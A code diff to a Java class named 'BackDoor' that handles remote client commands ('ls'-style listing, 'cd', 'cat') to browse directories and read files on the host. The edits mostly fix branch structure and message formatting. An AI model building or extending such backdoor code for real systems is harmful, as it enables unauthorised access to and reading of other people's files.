@@ -47,7 +47,9 @@ public class BackDoor {
 					
 					for(File f:allFiles) {
 					writer.write("\n\r"+f.getName()+(f.isDirectory()?" - Directory":" - file"));
+			
 					}
+					
 					
 				}else if(clientCommand.startsWith("cd")){
 						String d =clientCommand.split(" ")[1];
@@ -58,16 +60,18 @@ public class BackDoor {
 						}else {
 							work=new File(workingDir+File.separator+d);
 						}
-						
 						String temp=workingDir+File.separator+d;
 						if(new File(temp).isDirectory()) {
-							workingDir=temp;
+							workingDir = temp;
 						}
 						else {
-							writer.write("\n Directory doesn't exist");
+							writer.write("\n\r Directory doesn't exist:\n\r");
+						}
+						if(work.isDirectory()) {
+							workingDir = work.getAbsolutePath();
 						}
 						
-						if(clientCommand.startsWith("cat")) {
+				       }else if(clientCommand.startsWith("cat")) {
 							String b = clientCommand.split(" ")[1];
 							
 							String tempary=workingDir+File.separator+b;
@@ -81,10 +85,10 @@ public class BackDoor {
 					            writer.write("\n\r"+string);
 					        }
 						}else {
-							writer.write("\n File does not exist");
+						     writer.write("\n File does not exist");
 						}
 					}
-				}
+				
 		
 		
 		
